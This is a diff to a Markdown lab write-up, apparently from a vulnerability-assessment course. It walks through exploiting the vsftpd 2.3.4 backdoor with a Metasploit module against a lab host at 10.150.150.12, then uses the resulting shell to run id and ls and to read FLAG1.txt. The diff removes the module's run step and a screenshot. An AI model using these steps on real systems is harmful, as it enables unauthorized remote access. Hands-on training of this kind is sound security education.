@@ -50,21 +50,10 @@ As expected, we get a hit on an exploit for the vsftpd 2.3.4 backdoor. Use it by
 set RHOSTS 10.150.150.12
 ```
 
-![image](https://github.com/0yells/VA-Lab-Work/blob/3a97ffd965e28fbce58c8734cc2ad94346aab4e7/gambo/Screenshot%202026-04-12%20231645.png)
-
-and then we run the backdoor
-
-```bash
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
-```
-
-![gambar5](img/gambar5.png)
-
 And then we will be shown that we got a shell session, we can check using id command
 
-![gambar7](img/gambar7.png)
+![image](https://github.com/0yells/VA-Lab-Work/blob/3a97ffd965e28fbce58c8734cc2ad94346aab4e7/gambo/Screenshot%202026-04-12%20231645.png)
 
-```bash
 id
 ls
 cat FLAG1.txt
